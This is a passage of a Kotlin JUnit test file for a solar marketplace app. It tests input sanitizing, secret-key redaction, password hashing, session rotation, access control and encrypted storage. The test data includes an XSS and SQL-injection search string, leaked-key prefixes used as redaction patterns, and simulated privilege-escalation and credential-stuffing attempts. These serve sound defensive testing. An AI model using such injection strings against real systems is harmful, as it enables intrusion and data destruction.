                description = "Grade-A LiFePO4 cells with > 6000 cycles @ 80% DOD & < 2% self-discharge per month.",
                priceNgn = 1650000L,
                stockCount = 12
            ).isValid
        )
        org.junit.Assert.assertFalse(
            "Zero or negative product price must fail validation",
            com.example.util.SecuritySanitizer.validateProductInput(
                title = "Invalid Price Panel",
                brand = "Generic",
                description = "Valid description text for testing.",
                priceNgn = 0L,
                stockCount = 5
            ).isValid
        )

        // 8. Customer Review Schema
        assertTrue(
            com.example.util.SecuritySanitizer.validateReviewInput(
                customerName = "Dr. Funmi Adeyemi",
                rating = 5,
                comment = "Powers my 1.5HP inverter AC smoothly all night with < 40% battery drain!"
            ).isValid
        )
        org.junit.Assert.assertFalse(
            "Out-of-range star rating (6) must be rejected",
            com.example.util.SecuritySanitizer.validateReviewInput("Dr. Funmi", 6, "Good inverter").isValid
        )

        // 9. Search Fields Sanitization
        val cleanSearch = com.example.util.SecuritySanitizer.sanitizeSearchQuery("Growatt 5kVA <script>alert(1)</script>; DROP TABLE products; --")
        org.junit.Assert.assertFalse(cleanSearch.contains("<script", ignoreCase = true))
        org.junit.Assert.assertFalse(cleanSearch.contains("DROP TABLE", ignoreCase = true))
        assertTrue(cleanSearch.contains("Growatt 5kVA"))

        // 10. Delivery Address Schema
        assertTrue(
            com.example.util.SecuritySanitizer.validateDeliveryAddressInput(
                label = "Home",
                recipientName = "Engr. Chinedu Okafor",
                phone = "+2348031234567",
                streetAddress = "18 Allen Avenue, Ikeja",
                city = "Lagos",
                state = "Lagos State"
            ).isValid
        )

        // 11. Contact, Pre-Purchase Inquiry & Dispute Form Schema
        assertTrue(
            com.example.util.SecuritySanitizer.validateContactOrInquiryInput(
                requestType = "Live Warehouse Serial Plate Verification",
                notes = "Please share a clear photo of the SUN-5K serial plate before dispatch.",
                contact = "+2348031234567"
            ).isValid
        )

        // 12. Payment-Related Input Schema
        assertTrue(
            com.example.util.SecuritySanitizer.validatePaymentInput(
                reference = "SF-PAY-20261104-998877",
                amountNgn = 1850000L,
                customerEmail = "chinedu@solarfix.africa",
                channel = "card"
            ).isValid
        )
        org.junit.Assert.assertFalse(
            "Unsupported payment channel must be rejected",
            com.example.util.SecuritySanitizer.validatePaymentInput(
                reference = "SF-PAY-20261104-998877",
                amountNgn = 1850000L,
                customerEmail = "chinedu@solarfix.africa",
                channel = "crypto_unverified"
            ).isValid
        )

        // 14. Administrator Form Schema & Safe HTML Output Encoding
        assertTrue(
            com.example.util.SecuritySanitizer.validateAdminInspectionInput(
                reportId = "SFLAB-2026-9901",
                inspectionNote = "Verified pure sine wave THD < 3% under 5kW resistive load bank."
            ).isValid
        )

        val encodedHtml = com.example.util.SecuritySanitizer.encodeForSafeHtmlOutput("THD < 3% & Efficiency > 98% \"Class A\"")
        assertEquals("THD &lt; 3% &amp; Efficiency &gt; 98% &quot;Class A&quot;", encodedHtml)
    }

    @Test
    fun testApiKeysSecretsEnvironmentVariablesAndBackendProxyProtection() {
        // 1. Audit compiled BuildConfig to verify zero secret/private keys are bundled into the mobile APK
        val audit = com.example.util.SecureBackendProxyManager.auditCompiledBuildConfigSecurity()
        assertTrue(
            "BuildConfig must not expose any SECRET, PRIVATE, or GEMINI_API_KEY fields: ${audit.exposedSecretFieldNames}",
            audit.isCompliant
        )
        assertTrue(audit.exposedSecretFieldNames.isEmpty())
        assertEquals(6, audit.verifiedBackendProxyServices.size)

        // 2. Verify public client key sanitizer blocks and redacts accidental secret key values
        val validPublic = com.example.util.SecureBackendProxyManager.sanitizePublicKey("pk_test_solarfix_public_only_123")
        assertEquals("pk_test_solarfix_public_only_123", validPublic)

        val leakedPaystackSecret = com.example.util.SecureBackendProxyManager.sanitizePublicKey("sk_live_compromised_secret_999")
        assertEquals("REDACTED_ILLEGAL_SECRET_IN_PUBLIC_CONFIG", leakedPaystackSecret)

        val leakedFlutterwaveSecret = com.example.util.SecureBackendProxyManager.sanitizePublicKey("FLWSECK_TEST-123456789")
        assertEquals("REDACTED_ILLEGAL_SECRET_IN_PUBLIC_CONFIG", leakedFlutterwaveSecret)

        val leakedGoogleAiKey = com.example.util.SecureBackendProxyManager.sanitizePublicKey("AIzaSyD-compromised-google-key")
        assertEquals("REDACTED_ILLEGAL_SECRET_IN_PUBLIC_CONFIG", leakedGoogleAiKey)

        // 3. Verify PaystackPaymentGatewayManager never exposes a secret key in its public configuration
        val gatewayWithAccidentalSecret = com.example.data.payment.PaystackPaymentGatewayManager(
            publicKeyInput = "sk_test_accidentally_passed_to_public_field"
        )
        org.junit.Assert.assertFalse(
            "Gateway publicKey must never hold an sk_ secret key",
            gatewayWithAccidentalSecret.publicKey.startsWith("sk_", ignoreCase = true)
        )
        assertEquals("REDACTED_ILLEGAL_SECRET_IN_PUBLIC_CONFIG", gatewayWithAccidentalSecret.publicKey)

        // 4. Verify outbound mobile client HTTP header guard blocks raw third-party secret keys
        val safeProxyHeaders = mapOf(
            "Authorization" to "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImZpcmViYXNlX2lkX3Rva2VuIn0",
            "X-Firebase-AppCheck" to "eyJraWQiOiJhcHBfY2hlY2tfdG9rZW4ifQ"
        )
        assertTrue(com.example.util.SecureBackendProxyManager.validateOutboundClientHeaders(safeProxyHeaders).isValid)

        val unsafeDirectSecretHeaders = mapOf(
            "Authorization" to "Bearer sk_live_998877665544332211"
        )
        org.junit.Assert.assertFalse(
            "Mobile client must be blocked from sending raw Bearer sk_live_ secret keys",
            com.example.util.SecureBackendProxyManager.validateOutboundClientHeaders(unsafeDirectSecretHeaders).isValid
        )
    }

    @Test
    fun testSecureAuthenticationSessionLifecycleMfaAndAccountProtection() = kotlinx.coroutines.runBlocking {
        // 1. Strong Password Requirements & Breached Password Rejection
        org.junit.Assert.assertNotNull("Short password (<8) must be rejected", com.example.util.SecuritySanitizer.validatePasswordStrength("Sol1!"))
        org.junit.Assert.assertNotNull("Password without uppercase must be rejected", com.example.util.SecuritySanitizer.validatePasswordStrength("solarfix2026!"))
        org.junit.Assert.assertNotNull("Password without digit must be rejected", com.example.util.SecuritySanitizer.validatePasswordStrength("SolarFixSecure!"))
        org.junit.Assert.assertNotNull("Common breached password must be rejected", com.example.util.SecuritySanitizer.validatePasswordStrength("Password123"))
        org.junit.Assert.assertNull("Strong password must pass", com.example.util.SecuritySanitizer.validatePasswordStrength("SolarFix#2026!Pro"))

        // 2. Argon2id Salted Password Hashing & Constant-Time Verification
        val rawPass = "SolarFix#2026!Pro"
        val argonHash1 = com.example.util.SecuritySanitizer.hashPasswordArgon2id(rawPass)
        val argonHash2 = com.example.util.SecuritySanitizer.hashPasswordArgon2id(rawPass)
        assertTrue(argonHash1.startsWith("\$argon2id\$v=19\$m=16384,t=3,p=1\$"))
        assertTrue(com.example.util.SecuritySanitizer.isPasswordHashed(argonHash1))
        org.junit.Assert.assertFalse("Argon2id hash must never contain plaintext password", argonHash1.contains(rawPass))
        org.junit.Assert.assertNotEquals("Each Argon2id hash must use a unique random salt", argonHash1, argonHash2)
        assertTrue(com.example.util.SecuritySanitizer.verifyPassword(rawPass, argonHash1))
        org.junit.Assert.assertFalse(com.example.util.SecuritySanitizer.verifyPassword("WrongPass999", argonHash1))
        org.junit.Assert.assertFalse("Plaintext stored record must be rejected by strict verifyPassword", com.example.util.SecuritySanitizer.verifyPassword(rawPass, rawPass))

        // 3. Secure Registration, Email OTP & Phone OTP Verification (Zero Plaintext Storage)
        val authRepo = com.example.data.repository.AuthRepository(context = null)
        val otpResult = authRepo.initiateSignUpWithVerification(
            name = "Engr. Tunde Bakare",
            email = "tunde@solarfix.africa",
            password = rawPass
        )
        assertTrue(otpResult.isSuccess)
        val emailOtp = otpResult.getOrThrow()
        val pending = authRepo.pendingVerification.value!!
        assertTrue("Pending registration must store Argon2id hash, never plaintext", com.example.util.SecuritySanitizer.isPasswordHashed(pending.passwordHash))
        org.junit.Assert.assertFalse(pending.passwordHash.contains(rawPass))

        val verifiedAccountResult = authRepo.verifyEmailCode(emailOtp)
        assertTrue(verifiedAccountResult.isSuccess)
        val storedRecord = authRepo.getStoredPasswordRecordForAudit("tunde@solarfix.africa")
        org.junit.Assert.assertNotNull(storedRecord)
        assertTrue(com.example.util.SecuritySanitizer.isPasswordHashed(storedRecord))

        // Phone verification
        val phoneOtp = authRepo.initiatePhoneVerification("+2348031112233").getOrThrow()
        assertTrue(authRepo.verifyPhoneCode("+2348031112233", phoneOtp).isSuccess)
        assertTrue(authRepo.isPhoneVerified("+2348031112233"))

        // 4. Session Expiration, Token Refresh Rotation & Replay Revocation
        val initialTokens = authRepo.latestIssuedTokens
        org.junit.Assert.assertNotNull(initialTokens)
        assertTrue(authRepo.isCurrentSessionValid())

        // Rotate session tokens using refresh token
        val rotatedResult = authRepo.refreshSessionTokens(
            sessionId = initialTokens!!.sessionId,
            rawRefreshToken = initialTokens.refreshToken
        )
        assertTrue("Valid refresh token must rotate session tokens", rotatedResult.isSuccess)
        val rotatedTokens = rotatedResult.getOrThrow()
        org.junit.Assert.assertNotEquals("Access token must rotate", initialTokens.accessToken, rotatedTokens.accessToken)
        org.junit.Assert.assertNotEquals("Refresh token must rotate", initialTokens.refreshToken, rotatedTokens.refreshToken)

        // Replaying the old (already rotated) refresh token must be detected as token theft and revoke the session!
        val replayResult = authRepo.refreshSessionTokens(
            sessionId = initialTokens.sessionId,
            rawRefreshToken = initialTokens.refreshToken
        )
        assertTrue("Replaying an old refresh token must fail and revoke the session", replayResult.isFailure)
        org.junit.Assert.assertFalse("Session must be revoked after refresh token replay", authRepo.isSessionValid(initialTokens.sessionId))

        // 5. Brute-Force Lockout & Login Attempt Monitoring
        authRepo.resetCredentialStuffingGuard()
        repeat(com.example.data.repository.AuthRepository.MAX_FAILED_LOGIN_ATTEMPTS) {
            val badLogin = authRepo.login("tunde@solarfix.africa", "WrongPassword999!")
            assertTrue(badLogin.isFailure)
        }
        assertTrue("Account must be locked out after 5 failed login attempts", authRepo.isAccountLockedOut("tunde@solarfix.africa"))
        val blockedEvenWithCorrectPass = authRepo.login("tunde@solarfix.africa", rawPass)
        assertTrue("Locked out account must reject login even with valid password during lockout window", blockedEvenWithCorrectPass.isFailure)
        assertTrue("Login attempt audit log must record failed and locked attempts with masked email", authRepo.loginAttemptAuditLog.value.isNotEmpty())
        assertTrue(authRepo.loginAttemptAuditLog.value.all { it.maskedEmail.contains("***") })

        // 6. Credential Stuffing Protection (Multi-Account Burst Detection)
        authRepo.resetCredentialStuffingGuard()
        authRepo.login("victim1@solarfix.africa", "password123")
        authRepo.login("victim1@solarfix.africa", "12345678")
        authRepo.login("victim2@solarfix.africa", "password123")
        authRepo.login("victim2@solarfix.africa", "qwerty123")
        authRepo.login("victim3@solarfix.africa", "password123")
        authRepo.login("victim3@solarfix.africa", "admin123")
        assertTrue("Rapid multi-account failed logins must trigger credential-stuffing block", authRepo.isCredentialStuffingBlocked())
        authRepo.resetCredentialStuffingGuard()

        // 7. Secure Password Reset, Rate-Limiting & Session Revocation on Password Change
        authRepo.clearFailedLoginAttempts("tunde@solarfix.africa")
        authRepo.login("tunde@solarfix.africa", rawPass)
        val activeSessionBeforeReset = authRepo.latestIssuedTokens!!.sessionId
        assertTrue(authRepo.isSessionValid(activeSessionBeforeReset))

        val recoveryCode = authRepo.initiatePasswordRecovery("tunde@solarfix.africa").getOrThrow()
        val resetResult = authRepo.completePasswordReset(
            email = "tunde@solarfix.africa",
            recoveryCode = recoveryCode,
            newPassword = "NewSolarFix#2026! Pass"
        )
        assertTrue("Password reset with valid recovery code and strong password must succeed", resetResult.isSuccess)
        org.junit.Assert.assertFalse(
            "Completing password reset must automatically revoke all prior active sessions",
            authRepo.isSessionValid(activeSessionBeforeReset)
        )
        assertTrue("Login with new password must succeed", authRepo.login("tunde@solarfix.africa", "NewSolarFix#2026! Pass").isSuccess)

        // 8. Step-Up Multi-Factor Authentication (MFA) for Administrators and Sensitive Seller Payouts
        val (mfaChallenge, mfaCode) = authRepo.issueMfaChallenge(
            email = "admin@solarfix.africa",
            scope = com.example.data.repository.MfaOperationScope.ADMIN_WITHDRAWAL_APPROVAL
        ).getOrThrow()
        org.junit.Assert.assertFalse(
            authRepo.hasValidMfaGrant("admin@solarfix.africa", com.example.data.repository.MfaOperationScope.ADMIN_WITHDRAWAL_APPROVAL)
        )
        val grantResult = authRepo.verifyMfaChallenge(mfaChallenge.challengeId, mfaCode)
        assertTrue(grantResult.isSuccess)
        assertTrue(
            authRepo.hasValidMfaGrant("admin@solarfix.africa", com.example.data.repository.MfaOperationScope.ADMIN_WITHDRAWAL_APPROVAL)
        )

        // 9. Redact Authentication Tokens from URLs and Logs
        val urlWithTokens = "https://solarfix.africa/callback?access_token=sf_at_secret123&refresh_token=sf_rt_secret456&state=ok"
        val redactedUrl = com.example.util.SecuritySanitizer.redactTokensFromTextOrUrl(urlWithTokens)
        org.junit.Assert.assertFalse(redactedUrl.contains("sf_at_secret123"))
        org.junit.Assert.assertFalse(redactedUrl.contains("sf_rt_secret456"))
        assertTrue(redactedUrl.contains("[REDACTED_TOKEN]"))
    }

    @Test
    fun testRoleBasedAccessControlCustomerDataIsolation() {
        val repo = SolarRepository()
        val customerA = UserAccount(
            uid = "cust_uid_alpha_101",
            name = "Chidi Okafor",
            email = "chidi.okafor@example.com",
            role = UserRole.CUSTOMER
        )
        val customerB = UserAccount(
            uid = "cust_uid_beta_202",
            name = "Amina Bello",
            email = "amina.bello@example.com",
            role = UserRole.CUSTOMER
        )

        // Customer A and B add delivery addresses
        val addressA = DeliveryAddress(
            id = "addr_cust_a_1",
            label = "Home Residence",
            recipientName = customerA.name,
            phone = "+234 803 111 2222",
            streetAddress = "12 Victoria Island Close",
            city = "Lagos",
            state = "Lagos State",
            userUid = customerA.uid,
            userEmail = customerA.email
        )
        val addressB = DeliveryAddress(
            id = "addr_cust_b_2",
            label = "Office Hub",
            recipientName = customerB.name,
            phone = "+234 802 333 4444",
            streetAddress = "45 Garki District",
            city = "Abuja",
            state = "FCT Abuja",
            userUid = customerB.uid,
            userEmail = customerB.email
        )
        repo.addDeliveryAddress(addressA, callerUid = customerA.uid, callerEmail = customerA.email)
        repo.addDeliveryAddress(addressB, callerUid = customerB.uid, callerEmail = customerB.email)

        // Verify Customer A can only see Address A
        val addressesA = repo.getAddressesForCustomer(customerA.uid, customerA.email)
        assertTrue(addressesA.any { it.id == addressA.id })
        org.junit.Assert.assertFalse(addressesA.any { it.id == addressB.id })

        // Verify Customer A cannot delete Customer B's delivery address
        val unauthorizedDelete = repo.deleteAddress(addressB.id, callerUid = customerA.uid, callerEmail = customerA.email)
        org.junit.Assert.assertFalse(unauthorizedDelete)
        val addressesB = repo.getAddressesForCustomer(customerB.uid, customerB.email)
        assertTrue(addressesB.any { it.id == addressB.id })

        // Verify Customer Orders Isolation
        val ordersA = repo.getOrdersForCustomer(customerA.email, customerA.uid)
        ordersA.forEach { ord ->
            assertTrue(
                ord.customerEmail.equals(customerA.email, ignoreCase = true) || ord.customerUid == customerA.uid
            )
            org.junit.Assert.assertFalse(ord.customerEmail.equals(customerB.email, ignoreCase = true))
        }

        // Verify Customer cannot access Seller Dashboard via ViewModel
        val vm = MarketplaceViewModel(repo)
        vm.setPortalMode(MarketplacePortalMode.SELLER_DASHBOARD, currentUser = customerA)
        org.junit.Assert.assertNotEquals(MarketplacePortalMode.SELLER_DASHBOARD, vm.portalMode.value)
        org.junit.Assert.assertEquals(MarketplacePortalMode.SELLER_REGISTRATION, vm.portalMode.value)
    }

    @Test
    fun testRoleBasedAccessControlSellerStoreAndProductIsolation() {
        val repo = SolarRepository()
        val sellerA = UserAccount(
            uid = "seller_uid_nekes_01",
            name = "NEKES Energy Director",
            email = "nekeskingsley@gmail.com",
            role = UserRole.VERIFIED_SELLER
        )
        val sellerB = UserAccount(
            uid = "seller_uid_felicity_02",
            name = "Felicity Solar Admin",
            email = "seller.felicity@example.com",
            role = UserRole.VERIFIED_SELLER
        )

        // 1. Private Store Dossier Access Control: Seller B cannot see Seller A's bank or KYC documents
        val privateStoreForA = repo.getPrivateStoreForSeller("store_nekes", callerUid = sellerA.uid, callerEmail = sellerA.email)
        assertNotNull(privateStoreForA)
        org.junit.Assert.assertEquals("store_nekes", privateStoreForA?.id)

        val privateStoreDeniedForB = repo.getPrivateStoreForSeller("store_nekes", callerUid = sellerB.uid, callerEmail = sellerB.email)
        assertNull(privateStoreDeniedForB)

        // 2. Public Store Profile strips all sensitive bank and KYC records
        val publicProfiles = repo.getPublicStoreProfiles()
        assertTrue(publicProfiles.isNotEmpty())
        val nekesPublic = publicProfiles.find { it.id == "store_nekes" }
        assertNotNull(nekesPublic)
        org.junit.Assert.assertEquals("NEKES Solar Energy Store", nekesPublic?.storeName)

        // 3. Seller cannot manage another seller's products
        val foreignProduct = MarketplaceProduct(
            id = "prod_unauthorized_hack",
            title = "Malicious Inverter Injection",
            category = ProductCategory.INVERTERS,
            basePriceNgn = 450000L,
            brand = "Deye",
            modelNumber = "SUN-5K",
            powerRating = "5kW",
            voltage = "48V",
            description = "Unauthorized product creation attempt",
            storeId = "store_felicity",
            sellerName = "Felicity Solar Store",
            sellerLocation = "Alaba, Lagos",
            condition = "Brand New",
            warrantyPeriod = "5 Years",
            returnPolicy = "Standard SolarFix Warranty",
            deliveryAvailability = "Nationwide",
            specs = emptyMap<String, String>(),
            rating = 5.0f,
            reviewsCount = 0,
            stockCount = 10,
            inStock = true,
            isCertifiedSeller = true
        )
        var blockedProductCreation = false
        try {
            repo.addOrUpdateProduct(foreignProduct, callerStoreId = "store_nekes", isAdmin = false)
        } catch (_: SecurityException) {
            blockedProductCreation = true
        }
        assertTrue(blockedProductCreation)

        // 4. Seller cannot alter another seller's stock/pricing
        val felicityProd = repo.products.firstOrNull { it.storeId == "store_felicity" }
        if (felicityProd != null) {
            val altered = repo.updateProductPriceAndStock(felicityProd.id, 1000L, 999, callerStoreId = "store_nekes", isAdmin = false)
            org.junit.Assert.assertFalse(altered)
            val deleted = repo.deleteProductListing(felicityProd.id, callerStoreId = "store_nekes", isAdmin = false)
            org.junit.Assert.assertFalse(deleted)
        }

        // 5. Seller cannot modify their own commission rate or balances
        val originalNekesStore = repo.storesFlow.value.first { it.id == "store_nekes" }
        val maliciousStoreUpdate = originalNekesStore.copy(
            customCommissionPercent = 0.0, // Attempt 0% commission
            availableEarningsNgn = 999_999_999L // Attempt balance inflation
        )
        repo.createOrUpdateStore(maliciousStoreUpdate, callerUid = sellerA.uid, callerEmail = sellerA.email, isAdmin = false)
        val verifiedStore = repo.storesFlow.value.first { it.id == "store_nekes" }
        org.junit.Assert.assertEquals(originalNekesStore.customCommissionPercent, verifiedStore.customCommissionPercent)
        org.junit.Assert.assertEquals(originalNekesStore.availableEarningsNgn, verifiedStore.availableEarningsNgn)
    }

    @Test
    fun testRoleBasedAccessControlAdministratorGovernanceAndAuditLogging() {
        val repo = SolarRepository()
        val canonicalAdminEmail = "admin@solarfix.africa"
        val attackerEmail = "attacker@evil.com"

        val initialAuditCount = repo.adminAuditLogFlow.value.size
        val originalComm = repo.storesFlow.value.first { it.id == "store_nekes" }.customCommissionPercent

        try {
            // 1. Authorized Admin sets custom commission
            repo.setSellerCustomCommission("store_nekes", 1.5, adminEmail = canonicalAdminEmail)
            val updatedStore = repo.storesFlow.value.first { it.id == "store_nekes" }
            org.junit.Assert.assertEquals(1.5, updatedStore.customCommissionPercent ?: 0.0, 0.001)

            // Verify audit log record was appended
            val auditsAfterCommission = repo.adminAuditLogFlow.value
            assertTrue(auditsAfterCommission.size > initialAuditCount)
            val lastAudit = auditsAfterCommission.first()
            org.junit.Assert.assertEquals(AdminActionType.CUSTOM_COMMISSION_UPDATE, lastAudit.actionType)
            org.junit.Assert.assertEquals(canonicalAdminEmail, lastAudit.adminEmail)
            assertTrue(lastAudit.stepUpMfaVerified)

            // 2. Authorized Admin removes counterfeit product on dedicated test product
            val testFakeProd = MarketplaceProduct(
                id = "prod_audit_test_fake",
                title = "Counterfeit 10kVA Inverter Clone",
                category = ProductCategory.INVERTERS,
                basePriceNgn = 200000L,
                brand = "CounterfeitBrand",
                modelNumber = "FAKE-10K",
                powerRating = "10kVA",
                voltage = "48V",
                description = "Fake hardware listing",
                storeId = "store_nekes",
                sellerName = "NEKES Solar",
                sellerLocation = "Lagos",
                condition = "Brand New",
                warrantyPeriod = "1 Year",
                returnPolicy = "None",
                deliveryAvailability = "Nationwide",
                specs = emptyMap<String, String>(),
                rating = 5.0f,
                reviewsCount = 0,
                stockCount = 5,
                inStock = true,
                isCertifiedSeller = true
            )
            repo.addOrUpdateProduct(testFakeProd, callerStoreId = "store_nekes", isAdmin = true)
            repo.removeCounterfeitProduct(testFakeProd.id, "Counterfeit serial detected", adminEmail = canonicalAdminEmail)
            val moderatedProd = repo.products.first { it.id == testFakeProd.id }
            org.junit.Assert.assertEquals(ProductModerationStatus.REMOVED_COUNTERFEIT, moderatedProd.moderationStatus)
            org.junit.Assert.assertFalse(moderatedProd.isActive)
            repo.deleteProductListing(testFakeProd.id, isAdmin = true)
        } finally {
            repo.setSellerCustomCommission("store_nekes", originalComm, adminEmail = canonicalAdminEmail)
        }

        // 3. Unauthorized caller attempting admin operation throws SecurityException and logs incident
        var unauthorizedBlocked = false
        try {
            repo.updateMarketplaceSettings(MarketplaceSettings(defaultCommissionPercent = 0.0), adminEmail = attackerEmail)
        } catch (_: SecurityException) {
            unauthorizedBlocked = true
        }
        assertTrue(unauthorizedBlocked)
        val blockedAudit = repo.adminAuditLogFlow.value.first()
        org.junit.Assert.assertEquals(AdminActionType.PRIVILEGE_MODIFICATION_ATTEMPT_BLOCKED, blockedAudit.actionType)
        org.junit.Assert.assertEquals(attackerEmail, blockedAudit.adminEmail)
    }

    @Test
    fun testRoleBasedAccessControlPrivilegeEscalationPrevention() {
        // 1. Whitelist validation
        assertTrue(FirebaseAuthAdminHandler.isOwnerOrSystemAdminEmail("nekeskingsley@gmail.com"))
        assertTrue(FirebaseAuthAdminHandler.isOwnerOrSystemAdminEmail("admin@solarfix.africa"))
        org.junit.Assert.assertFalse(FirebaseAuthAdminHandler.isOwnerOrSystemAdminEmail("attacker@gmail.com"))
        org.junit.Assert.assertFalse(FirebaseAuthAdminHandler.isOwnerOrSystemAdminEmail("admin@solarfix.africa.attacker.com"))

        // 2. Domain UserAccount Role Checks
        val customer = UserAccount(uid = "u1", name = "Customer", email = "cust@test.com", role = UserRole.CUSTOMER)
        assertTrue(customer.isCustomer)
        org.junit.Assert.assertFalse(customer.isSeller)
        org.junit.Assert.assertFalse(customer.isAdmin)
        org.junit.Assert.assertFalse(customer.canAccessSellerHub())
        org.junit.Assert.assertFalse(customer.canAccessAdmin())

        val seller = UserAccount(uid = "u2", name = "Seller", email = "seller@test.com", role = UserRole.VERIFIED_SELLER)
        assertTrue(seller.isSeller)
        assertTrue(seller.canAccessSellerHub())
        org.junit.Assert.assertFalse(seller.canAccessAdmin())

        val admin = UserAccount(uid = "u3", name = "Admin", email = "admin@solarfix.africa", role = UserRole.ADMIN, isAdmin = true)
        assertTrue(admin.isAdmin)
        assertTrue(admin.canAccessAdmin())
        assertTrue(admin.canAccessSellerHub())

        // 3. Sync to Firestore strips unauthorized admin elevation
        val maliciousUser = UserAccount(
            uid = "u_hacker",
            name = "Hacker User",
            email = "hacker@test.com",
            role = UserRole.ADMIN,
            isAdmin = true
        )
        val handler = FirebaseAuthAdminHandler(null, null)
        kotlinx.coroutines.runBlocking {
            val syncResult = handler.syncUserToFirestore(maliciousUser).getOrThrow()
            org.junit.Assert.assertFalse(syncResult.isAdmin)
            org.junit.Assert.assertEquals(UserRole.CUSTOMER.name, syncResult.role)
        }
    }

    @Test
    fun testDatabaseFieldLevelAes256GcmEncryptionAndKeyRotation() {
        try {
            // Reset to v1 key for deterministic baseline
            com.example.util.DatabaseEncryptionAndSecurityManager.rotateActiveEncryptionKey("sf_kek_v1")

            // 1. Encrypt and decrypt across all 7 sensitive data categories
            val ninDoc = "NIN-29384756102"
            val encNin = com.example.util.DatabaseEncryptionAndSecurityManager.encryptSensitiveField(
                plaintext = ninDoc,
                associatedData = "stores:store_nekes:idDocumentNumber"
            )
            assertTrue(com.example.util.DatabaseEncryptionAndSecurityManager.isEncryptedPayload(encNin))
            org.junit.Assert.assertFalse("Ciphertext must never contain plaintext NIN", encNin.contains(ninDoc))
            assertEquals(
                ninDoc,
                com.example.util.DatabaseEncryptionAndSecurityManager.decryptSensitiveField(
                    ciphertextPayload = encNin,
                    associatedData = "stores:store_nekes:idDocumentNumber"
                )
            )

            // 2. Verify AEAD associated-data context binding prevents cross-record ciphertext substitution
            var aeadMismatchBlocked = false
            try {
                com.example.util.DatabaseEncryptionAndSecurityManager.decryptSensitiveField(
                    ciphertextPayload = encNin,
                    associatedData = "stores:store_other_attacker:idDocumentNumber"
                )
            } catch (_: SecurityException) {
                aeadMismatchBlocked = true
            }
            assertTrue("AEAD context mismatch must fail GCM authentication tag verification", aeadMismatchBlocked)

            // 3. Key Rotation: Rotate to sf_kek_v2 and verify old v1 ciphertexts and new v2 ciphertexts both decrypt
            com.example.util.DatabaseEncryptionAndSecurityManager.rotateActiveEncryptionKey("sf_kek_v2")
            assertEquals("sf_kek_v2", com.example.util.DatabaseEncryptionAndSecurityManager.getCurrentKeyId())

            val bankAccount = "0123456789"
            val encBankV2 = com.example.util.DatabaseEncryptionAndSecurityManager.encryptSensitiveField(
                plaintext = bankAccount,
                associatedData = "stores:store_nekes:bankAccountNumber"
            )
            assertTrue(encBankV2.startsWith("enc:v1:sf_kek_v2:"))

            // Both v1 and v2 ciphertexts must decrypt cleanly
            assertEquals(
                ninDoc,
                com.example.util.DatabaseEncryptionAndSecurityManager.decryptSensitiveField(
                    ciphertextPayload = encNin,
                    associatedData = "stores:store_nekes:idDocumentNumber"
                )
            )
            assertEquals(
                bankAccount,
                com.example.util.DatabaseEncryptionAndSecurityManager.decryptSensitiveField(
                    ciphertextPayload = encBankV2,
                    associatedData = "stores:store_nekes:bankAccountNumber"
                )
            )

            // 4. Authentication token encryption at rest
            val tokenRecord = com.example.util.DatabaseEncryptionAndSecurityManager.encryptAuthTokensForStorage(
                sessionId = "sess_991",
                userUid = "user_991",
                accessToken = "sf_at_live_secret_token_abc",
                refreshToken = "sf_rt_live_secret_token_xyz",
                expiresAtEpoch = System.currentTimeMillis() + 900_000L
            )
            org.junit.Assert.assertFalse(tokenRecord.encryptedAccessToken.contains("sf_at_live_secret_token_abc"))
            org.junit.Assert.assertFalse(tokenRecord.encryptedRefreshToken.contains("sf_rt_live_secret_token_xyz"))
            val (decAccess, decRefresh) = com.example.util.DatabaseEncryptionAndSecurityManager.decryptAuthTokensFromStorage(
                record = tokenRecord
            )
            assertEquals("sf_at_live_secret_token_abc", decAccess)
            assertEquals("sf_rt_live_secret_token_xyz", decRefresh)
        } finally {
            com.example.util.DatabaseEncryptionAndSecurityManager.rotateActiveEncryptionKey("sf_kek_v1")
        }
    }

    @Test
    fun testDatabaseEntityEncryptionAndFinancialLedgerHmacTamperDetection() {
        val repo = SolarRepository()
        val originalStore = repo.storesFlow.value.first { it.id == "store_nekes" }

        // 1. Encrypt SellerStore for at-rest storage
        val encryptedStoreRecord = repo.getEncryptedStoreRecordAtRest("store_nekes")
        org.junit.Assert.assertNotNull(encryptedStoreRecord)
        val encRecord = encryptedStoreRecord!!

        assertTrue(com.example.util.DatabaseEncryptionAndSecurityManager.isEncryptedPayload(encRecord.encryptedOwnerEmail))
        assertTrue(com.example.util.DatabaseEncryptionAndSecurityManager.isEncryptedPayload(encRecord.encryptedPhone))
        assertTrue(com.example.util.DatabaseEncryptionAndSecurityManager.isEncryptedPayload(encRecord.encryptedPhysicalAddress))
        assertTrue(com.example.util.DatabaseEncryptionAndSecurityManager.isEncryptedPayload(encRecord.encryptedIdDocumentNumber))
        assertTrue(com.example.util.DatabaseEncryptionAndSecurityManager.isEncryptedPayload(encRecord.encryptedBankAccountNumber))
        org.junit.Assert.assertFalse(encRecord.encryptedBankAccountNumber.contains(originalStore.bankAccountNumber))
        org.junit.Assert.assertFalse(encRecord.encryptedIdDocumentNumber.contains(originalStore.idDocumentNumber))

        // 2. Decrypt back and verify all sensitive fields match
        val decryptedStore = com.example.util.DatabaseEncryptionAndSecurityManager.decryptSellerStoreFromDatabase(
            record = encRecord,
            templateStore = originalStore
        )
        assertEquals(originalStore.ownerEmail, decryptedStore.ownerEmail)
        assertEquals(originalStore.phone, decryptedStore.phone)
        assertEquals(originalStore.physicalAddress, decryptedStore.physicalAddress)
        assertEquals(originalStore.idDocumentNumber, decryptedStore.idDocumentNumber)
        assertEquals(originalStore.bankAccountNumber, decryptedStore.bankAccountNumber)
        assertEquals(originalStore.availableEarningsNgn, decryptedStore.availableEarningsNgn)

        // 3. Financial Ledger Tamper Detection: Modify availableEarningsNgn directly in database record without HMAC key
        val tamperedStoreRecord = encRecord.copy(availableEarningsNgn = encRecord.availableEarningsNgn + 50_000_000L)
        var ledgerTamperDetected = false
        try {
            com.example.util.DatabaseEncryptionAndSecurityManager.decryptSellerStoreFromDatabase(
                record = tamperedStoreRecord,
                templateStore = originalStore
            )
        } catch (_: SecurityException) {
            ledgerTamperDetected = true
        }
        assertTrue("Unauthorized database modification of seller financial balance must fail HMAC check", ledgerTamperDetected)

        // 4. Encrypt & decrypt customer DeliveryAddress at rest
        val sampleAddr = repo.addressesFlow.value.first()
        val encAddr = repo.getEncryptedAddressRecordAtRest(sampleAddr.id)!!
        assertTrue(com.example.util.DatabaseEncryptionAndSecurityManager.isEncryptedPayload(encAddr.encryptedRecipientName))
        assertTrue(com.example.util.DatabaseEncryptionAndSecurityManager.isEncryptedPayload(encAddr.encryptedPhone))
